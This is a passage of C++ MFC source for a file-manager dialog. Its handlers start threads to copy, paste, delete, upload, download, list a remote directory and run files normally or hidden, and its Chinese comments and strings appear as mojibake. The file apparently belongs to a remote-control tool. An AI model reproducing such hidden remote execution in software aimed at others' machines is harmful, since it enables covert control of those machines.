			pSubMenu->EnableMenuItem(ID_FILE_REFURSH, MF_ENABLED);//--

			pToolBar->EnableButton(ID_FILE_COPY, FALSE);
			pToolBar->EnableButton(ID_FILE_PASTE, TRUE);
			pToolBar->EnableButton(ID_FILE_DELETE, FALSE);
			pToolBar->EnableButton(ID_FILE_UPLOAD, TRUE);
			pToolBar->EnableButton(ID_FILE_DOWNLOAD, FALSE);
			pToolBar->EnableButton(ID_FILE_REFURSH, TRUE);
		}
	}
	if (!bCopySel)
	{
		pSubMenu->EnableMenuItem(ID_FILE_PASTE, MF_GRAYED);

		pToolBar->EnableButton(ID_FILE_PASTE, FALSE);
	}

	*pResult = 0;
}

//�Ҽ���������ʾ�˵�
void CFileDlg::OnRclickFilelist(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: Add your control notification handler code here
	//�Ȱ������������ʾ�˵�
	OnClickFilelist(pNMHDR, pResult);

	//��ʾ�Ҽ��˵�
	CMenu* pSubMenu;
	pSubMenu = m_FileMenu.GetSubMenu(0);
	CPoint oPoint;
	GetCursorPos(&oPoint);
	pSubMenu->TrackPopupMenu(TPM_LEFTALIGN, oPoint.x, oPoint.y, this);

	*pResult = 0;
}

void CFileDlg::OnFileRunnormal()
{
	// TODO: Add your command handler code here
	if (m_hWorkThread != NULL)
		return;

	m_hWorkThread = ThreadTemplate::StartThread<CFileDlg, DWORD>(this, &CFileDlg::FileExecNormal);

	if (m_hWorkThread == NULL)
		StatusTextOut(0, "���ļ�ʧ��");
}

void CFileDlg::OnFileRunhide()
{
	// TODO: Add your command handler code here
	if (m_hWorkThread != NULL)
		return;

	m_hWorkThread = ThreadTemplate::StartThread<CFileDlg, DWORD>(this, &CFileDlg::FileExecHide);

	if (m_hWorkThread == NULL)
		StatusTextOut(0, "���ش��ļ�ʧ��");
}

void CFileDlg::OnFileCopy()
{
	// TODO: Add your command handler code here
	if (m_hWorkThread != NULL)
		return;

	bCopySel = TRUE;
	m_CopyPath = m_SendPath;
}

void CFileDlg::OnFilePaste()
{
	// TODO: Add your command handler code here
	if (m_hWorkThread != NULL)
		return;

	if (!bCopySel)
		return;
	bCopySel = FALSE;

	m_hWorkThread = ThreadTemplate::StartThread<CFileDlg, DWORD>(this, &CFileDlg::FilePaste);

	if (m_hWorkThread == NULL)
		StatusTextOut(0, "����ճ���ļ�ʧ��");
}

void CFileDlg::OnFileDelete()
{
	// TODO: Add your command handler code here
	if (m_hWorkThread != NULL)
		return;

	m_hWorkThread = ThreadTemplate::StartThread<CFileDlg, DWORD>(this, &CFileDlg::FileDelete);

	if (m_hWorkThread == NULL)
		StatusTextOut(0, "ɾ���ļ�ʧ��");
}

void CFileDlg::OnFileUpload()
{
	// TODO: Add your command handler code here
	if (m_hWorkThread != NULL)
		return;

	m_hWorkThread = ThreadTemplate::StartThread<CFileDlg, DWORD>(this, &CFileDlg::FileUpLoad);

	if (m_hWorkThread == NULL)
		StatusTextOut(0, "�ϴ��ļ�ʧ��");
}

void CFileDlg::OnFileDownload()
{
	// TODO: Add your command handler code here
	if (m_hWorkThread != NULL)
		return;

	m_hWorkThread = ThreadTemplate::StartThread<CFileDlg, DWORD>(this, &CFileDlg::FileDownLoad);

	if (m_hWorkThread == NULL)
		StatusTextOut(0, "�����ļ�ʧ��");
}

void CFileDlg::OnFileRefursh()
{
	// TODO: Add your command handler code here
	if (m_hWorkThread != NULL)
		return;

	//ƴ���о�·��
	m_SendPath = m_CurrPath + "\\*";

	//�о�Ŀ¼
	m_hWorkThread = ThreadTemplate::StartThread<CFileDlg, DWORD>(this, &CFileDlg::ListDirectory);

	if (m_hWorkThread == NULL)
		StatusTextOut(0, "��ȡԶ��Ŀ¼�б�ʧ��");
}

void CFileDlg::OnBtnAddrGo()
{
	// TODO: Add your control notification handler code here
	UpdateData();
	OnFileRefursh();
}

void CFileDlg::OnColumnclickFilelist(NMHDR* pNMHDR, LRESULT* pResult)
{
	NM_LISTVIEW* pNMListView = (NM_LISTVIEW*)pNMHDR;
	// TODO: Add your control notification handler code here

	*pResult = 0;
}
